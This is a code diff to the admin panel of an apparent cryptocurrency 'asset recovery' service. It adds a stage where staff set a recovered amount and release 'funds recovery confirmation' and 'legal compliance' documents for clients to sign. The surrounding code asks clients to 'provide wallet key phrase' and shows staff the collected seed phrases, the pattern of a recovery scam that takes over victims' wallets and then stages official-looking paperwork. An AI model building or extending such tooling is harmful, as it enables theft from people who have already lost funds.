@@ -21,7 +21,9 @@ import {
   Check as CheckSymbolIcon,
   X as XIcon,
   Server as ServerIcon,
-  Mail as MailIcon
+  Mail as MailIcon,
+  FileText as FileTextIcon,
+  PenLine as PenIcon
 } from 'lucide-react';
 import { 
   collection, 
@@ -38,6 +40,8 @@ import { db, handleFirestoreError, OperationType, auth } from '../lib/firebase';
 import { isAdminEmail } from '../lib/adminConfig';
 import {
   fetchAdminCase,
+  downloadAdminCasePdf,
+  fetchAdminCaseSignatureBlob,
   fetchAdminCases,
   mergeAdminCases,
   patchAdminCase,
@@ -45,6 +49,7 @@ import {
   postAdminCaseMessage,
   type AdminCaseRecord,
 } from '../lib/adminApi';
+import { CASE_STAGES, DOCUMENT_TYPES, formatRecoveredAmount } from '../lib/caseStages';
 import { signInWithPopup, GoogleAuthProvider, onAuthStateChanged, User as FirebaseUser } from 'firebase/auth';
 import { motion, AnimatePresence } from 'motion/react';
 
@@ -64,15 +69,14 @@ const CaseManagerView: React.FC = () => {
   const [searchTerm, setSearchTerm] = React.useState('');
   const [authChecking, setAuthChecking] = React.useState(true);
   const [isAuthorized, setIsAuthorized] = React.useState(false);
+  const [recoveredAmountInput, setRecoveredAmountInput] = React.useState('');
+  const [signingError, setSigningError] = React.useState<string | null>(null);
+  const [releasingDocs, setReleasingDocs] = React.useState(false);
 
-  const statusLevels = [
-    { id: 'PENDING', label: 'Intake Received' },
-    { id: 'INITIALIZING', label: 'Metadata Extraction' },
-    { id: 'ANALYSIS', label: 'Wallet Verification Journey Analysis' },
-    { id: 'PROCESSING', label: 'Transaction Forensic Trace' },
-    { id: 'RECOVERY', label: 'Asset Recovery' },
-    { id: 'COMPLETED', label: 'Restoration Ready' }
-  ];
+  const statusLevels = CASE_STAGES.map((stage) => ({
+    id: stage.id,
+    label: stage.label,
+  }));
 
   const loadServerCases = React.useCallback(async () => {
     const result = await fetchAdminCases();
@@ -106,7 +110,7 @@ const CaseManagerView: React.FC = () => {
     let firestoreReady = false;
     let serverReady = false;
     const maybeDoneLoading = () => {
-      if (firestoreReady && serverReady) setLoading(false);
+      if (serverReady) setLoading(false);
     };
 
     setLoading(true);
@@ -190,6 +194,16 @@ const CaseManagerView: React.FC = () => {
     const useServerStore = !firestoreDocId;
 
     try {
+      const typedAmount = Number(recoveredAmountInput);
+      const existingAmount =
+        Number.isFinite(typedAmount) && typedAmount > 0
+          ? typedAmount
+          : Number(caseRow?.recoveredAmount);
+      if (newStatus === 'SIGNING' && (!Number.isFinite(existingAmount) || existingAmount <= 0)) {
+        setSigningError('Enter the recovered amount before releasing Document Acknowledgement.');
+        return;
+      }
+
       if (useServerStore) {
         const statusLabel =
           statusLevels.find((l) => l.id === newStatus)?.label || newStatus;
@@ -205,20 +219,40 @@ const CaseManagerView: React.FC = () => {
             type: 'ACTION_REQUIRED',
           };
         }
-        const result = await patchAdminCaseStatus(
-          serverCaseId,
-          newStatus,
-          notification
-        );
+        if (newStatus === 'SIGNING') {
+          notification = {
+            title: 'Action Required',
+            message:
+              'Review and sign the funds recovery confirmation and legal compliance documents. The recovered amount is shown on the confirmation.',
+            type: 'ACTION_REQUIRED',
+          };
+        }
+        const result =
+          newStatus === 'SIGNING'
+            ? await patchAdminCase(serverCaseId, {
+                status: newStatus,
+                recoveredAmount: existingAmount,
+                documentsReleased: true,
+                notification,
+              })
+            : await patchAdminCaseStatus(serverCaseId, newStatus, notification);
         if (!result.ok) {
           throw new Error(result.error || 'Server update failed');
         }
+        setSigningError(null);
         await loadServerCases();
       } else if (firestoreDocId) {
         const ref = doc(db, 'recovery_requests', firestoreDocId);
         await updateDoc(ref, {
           status: newStatus,
           updatedAt: serverTimestamp(),
+          ...(newStatus === 'SIGNING'
+            ? {
+                recoveredAmount: existingAmount,
+                documentsReleased: true,
+                documentsReleasedAt: serverTimestamp(),
+              }
+            : {}),
         });
 
         const statusLabel =
@@ -234,6 +268,12 @@ const CaseManagerView: React.FC = () => {
             'Provide wallet key phrase in the space below';
           notificationType = 'ACTION_REQUIRED';
         }
+        if (newStatus === 'SIGNING') {
+          notificationTitle = 'Action Required';
+          notificationMessage =
+            'Review and sign the funds recovery confirmation and legal compliance documents. The recovered amount is shown on the confirmation.';
+          notificationType = 'ACTION_REQUIRED';
+        }
 
         await createNotification(
           firestoreDocId,
@@ -241,15 +281,27 @@ const CaseManagerView: React.FC = () => {
           notificationMessage,
           notificationType
         );
+        setSigningError(null);
       }
 
       if (
         selectedCase?.id === requestId ||
         selectedCase?.caseId === requestId
       ) {
-        setSelectedCase({ ...selectedCase, status: newStatus });
+        setSelectedCase({
+          ...selectedCase,
+          status: newStatus,
+          ...(newStatus === 'SIGNING'
+            ? {
+                recoveredAmount: existingAmount,
+                documentsReleased: true,
+              }
+            : {}),
+        });
       }
     } catch (err) {
+      const message = err instanceof Error ? err.message : 'Update failed';
+      setSigningError(message);
       if (!useServerStore) {
         handleFirestoreError(
           err,
@@ -320,6 +372,18 @@ const CaseManagerView: React.FC = () => {
     }, 5000);
     return () => clearInterval(interval);
   }, []);
+
+  React.useEffect(() => {
+    if (!selectedCase || selectedCase.id === 'smtp_diagnostics') return;
+    const amount = selectedCase.recoveredAmount ?? requests.find(
+      (r) =>
+        r.id === selectedCase.id ||
+        r.caseId === selectedCase.id ||
+        r.firestoreDocId === selectedCase.id
+    )?.recoveredAmount;
+    setRecoveredAmountInput(amount ? String(amount) : '');
+    setSigningError(null);
+  }, [selectedCase?.id, selectedCase?.recoveredAmount, requests]);
 
   if (authChecking) {
     return (
@@ -453,10 +517,13 @@ const CaseManagerView: React.FC = () => {
             </div>
 
             <div className="space-y-3 max-h-[600px] overflow-y-auto pr-2 custom-scrollbar">
-              {errorStatus && errorStatus !== 'NO_DATA_CONNECTED' ? (
+              {errorStatus && errorStatus !== 'NO_DATA_CONNECTED' && filteredRequests.length === 0 && !loading ? (
                 <div className="text-center py-12 px-4 space-y-4">
                    <div className="text-red-500 font-mono text-[10px] uppercase">{errorStatus}</div>
                    <p className="text-[8px] text-slate-600 uppercase">Check Firestore security rules or internet connection.</p>
+                   {serverLoadError && (
+                     <p className="text-[8px] text-amber-500/80 uppercase">{serverLoadError}</p>
+                   )}
                 </div>
               ) : loading ? (
                 <div className="text-center py-12 opacity-50 flex flex-col items-center gap-3">
@@ -507,7 +574,8 @@ const CaseManagerView: React.FC = () => {
                       <div className="flex items-center gap-2">
                         <span className="text-[10px] font-mono text-slate-500 uppercase">#{req.id.slice(0, 8)}</span>
                         <span className={`text-[8px] font-bold px-1.5 py-0.5 rounded ${
-                          req.status === 'RECOVERY' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' :
+                          req.status === 'RECOVERY' || req.status === 'COMPLETED' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' :
+                          req.status === 'SIGNING' ? 'bg-amber-500/10 text-amber-300 border border-amber-500/30' :
                           req.status === 'ANALYSIS' ? 'bg-amber-500/10 text-amber-500 border border-amber-500/20' :
                           'bg-blue-500/10 text-blue-400 border border-blue-500/20'
                         } uppercase tracking-tighter`}>{req.status}</span>
@@ -743,7 +811,46 @@ const CaseManagerView: React.FC = () => {
                             isSecret={!activeCaseData.walletKeyphrase} 
                             isHighlighted={!!activeCaseData.walletKeyphrase}
                           />
-                          <DataField label="Last Metadata Sync" value={activeCaseData.updatedAt?.toDate?.()?.toLocaleString() || 'N/A'} />
+                          <DataField label="Last Metadata Sync" value={activeCaseData.updatedAt?.toDate?.()?.toLocaleString() || (typeof activeCaseData.updatedAt === 'string' ? new Date(activeCaseData.updatedAt).toLocaleString() : 'N/A')} />
+                          <DataField
+                            label="Recovered Amount"
+                            value={
+                              activeCaseData.recoveredAmount
+                                ? formatRecoveredAmount(
+                                    Number(activeCaseData.recoveredAmount),
+                                    String(activeCaseData.recoveredAmountCurrency || 'USD')
+                                  )
+                                : 'NOT_SET'
+                            }
+                            isHighlighted={!!activeCaseData.recoveredAmount}
+                          />
+
+                          <AdminDocumentReleasePanel
+                            amountInput={recoveredAmountInput}
+                            onAmountChange={setRecoveredAmountInput}
+                            error={signingError}
+                            releasing={releasingDocs}
+                            caseData={activeCaseData}
+                            onRelease={async () => {
+                              setReleasingDocs(true);
+                              try {
+                                await handleUpdateStatus(activeCaseData.id, 'SIGNING');
+                              } finally {
+                                setReleasingDocs(false);
+                              }
+                            }}
+                            onVerify={async () => {
+                              if (activeServerCaseId) {
+                                await patchAdminCase(activeServerCaseId, { verifyDocuments: true });
+                                await loadServerCases();
+                              } else if (activeFirestoreId) {
+                                await updateDoc(doc(db, 'recovery_requests', activeFirestoreId), {
+                                  documentsVerifiedAt: serverTimestamp(),
+                                });
+                              }
+                            }}
+                            serverCaseId={activeServerCaseId}
+                          />
                           
                           <div className="p-4 rounded-xl border border-blue-500/20 bg-blue-500/5 mt-8">
                              <div className="flex items-center gap-3 mb-2">
@@ -755,6 +862,7 @@ const CaseManagerView: React.FC = () => {
                                {activeCaseData.walletKeyphrase 
                                 ? " Keyphrase received. Proceed to Forensic Trace Analysis." 
                                 : " Requirement: Set status to ANALYSIS to trigger user verification form."}
+                               {" "}Set status to SIGNING after entering the recovered amount to release both official documents on the client portal.
                              </p>
                           </div>
                         </div>
@@ -1121,6 +1229,156 @@ const DiagnosticField = ({ label, value, status, onCopy }: { label: string, valu
     </div>
   </div>
 );
+
+const AdminDocumentReleasePanel = ({
+  amountInput,
+  onAmountChange,
+  error,
+  releasing,
+  caseData,
+  onRelease,
+  onVerify,
+  serverCaseId,
+}: {
+  amountInput: string;
+  onAmountChange: (value: string) => void;
+  error: string | null;
+  releasing: boolean;
+  caseData: any;
+  onRelease: () => Promise<void>;
+  onVerify: () => Promise<void>;
+  serverCaseId: string | null;
+}) => {
+  const signed = (caseData.signedDocuments || {}) as Record<string, any>;
+  const bothSigned = Boolean(signed.funds_confirmation && signed.legal_compliance);
+
+  return (
+    <div className="p-4 rounded-xl border border-amber-500/30 bg-amber-500/5 space-y-4">
+      <div className="flex items-center gap-3">
+        <PenIcon className="text-amber-400" size={16} />
+        <h5 className="text-[10px] font-manrope font-black text-white uppercase tracking-widest">
+          Document Acknowledgement
+        </h5>
+      </div>
+      <p className="text-[10px] text-slate-400 font-mono leading-relaxed">
+        Enter the recovered amount, then release stage 6. The client portal will show two official documents to review and sign.
+      </p>
+      <label className="block space-y-1.5">
+        <span className="text-[9px] font-mono text-slate-500 uppercase tracking-widest">Recovered amount (USD)</span>
+        <input
+          type="number"
+          min="0"
+          step="0.01"
+          value={amountInput}
+          onChange={(e) => onAmountChange(e.target.value)}
+          placeholder="0.00"
+          className="w-full bg-[#05070a] border border-white/10 rounded-lg px-3 py-2 text-xs font-mono text-white outline-none focus:border-amber-400"
+        />
+      </label>
+      {error && <p className="text-[10px] font-mono text-red-400">{error}</p>}
+      <button
+        type="button"
+        onClick={onRelease}
+        disabled={releasing}
+        className="w-full py-2.5 rounded-lg bg-amber-500 text-slate-950 text-[10px] font-manrope font-black uppercase tracking-widest disabled:opacity-50"
+      >
+        {releasing ? 'Releasing...' : 'Release documents to client'}
+      </button>
+      <div className="space-y-2">
+        {DOCUMENT_TYPES.map((doc) => {
+          const rec = signed[doc.id];
+          return (
+            <AdminSignedDocRow
+              key={doc.id}
+              label={doc.shortLabel}
+              record={rec}
+              caseId={serverCaseId || String(caseData.caseId || caseData.id)}
+              documentType={doc.id}
+            />
+          );
+        })}
+      </div>
+      {bothSigned && (
+        <button
+          type="button"
+          onClick={onVerify}
+          className="w-full py-2 rounded-lg border border-emerald-500/40 text-emerald-300 text-[10px] font-mono uppercase tracking-widest"
+        >
+          Mark signed documents verified
+        </button>
+      )}
+    </div>
+  );
+};
+
+const AdminSignedDocRow: React.FC<{
+  label: string;
+  record?: any;
+  caseId: string;
+  documentType: string;
+}> = ({
+  label,
+  record,
+  caseId,
+  documentType,
+}) => {
+  const [src, setSrc] = React.useState<string | null>(record?.signatureDataUrl || null);
+
+  React.useEffect(() => {
+    let revoked: string | null = null;
+    if (record?.signatureDataUrl) {
+      setSrc(record.signatureDataUrl);
+      return;
+    }
+    if (!record?.signatureFilename && !record?.signedAt) {
+      setSrc(null);
+      return;
+    }
+    fetchAdminCaseSignatureBlob(caseId, documentType).then((url) => {
+      if (url) {
+        revoked = url;
+        setSrc(url);
+      }
+    });
+    return () => {
+      if (revoked) URL.revokeObjectURL(revoked);
+    };
+  }, [caseId, documentType, record?.signatureFilename, record?.signedAt, record?.signatureDataUrl]);
+
+  return (
+    <div className="p-3 rounded-lg bg-black/30 border border-white/5">
+      <div className="flex items-center justify-between gap-2 mb-2">
+        <span className="text-[10px] font-mono text-white uppercase tracking-widest flex items-center gap-2">
+          <FileTextIcon size={12} className="text-amber-400" />
+          {label}
+        </span>
+        <span className={`text-[8px] font-mono uppercase ${record ? 'text-emerald-400' : 'text-slate-500'}`}>
+          {record ? 'Signed' : 'Awaiting'}
+        </span>
+      </div>
+      {record && (
+        <p className="text-[9px] font-mono text-slate-400 mb-2">
+          {record.signerName} · {record.signedAt ? new Date(record.signedAt).toLocaleString() : ''}
+        </p>
+      )}
+      {src && <img src={src} alt={`${label} signature`} className="h-12 bg-white rounded object-contain w-full" />}
+      {record && (
+        <button
+          type="button"
+          onClick={async () => {
+            const result = await downloadAdminCasePdf(caseId, documentType);
+            if (!result.ok) {
+              window.alert(result.error || "Could not download the signed PDF.");
+            }
+          }}
+          className="mt-3 w-full py-2 rounded-lg bg-blue-600 text-white text-[9px] font-mono uppercase tracking-widest"
+        >
+          Download signed PDF
+        </button>
+      )}
+    </div>
+  );
+};
 
 const DataField = ({ label, value, isSecret, isHighlighted }: { label: string, value: string, isSecret?: boolean, isHighlighted?: boolean }) => (
   <div className="space-y-1.5 group">
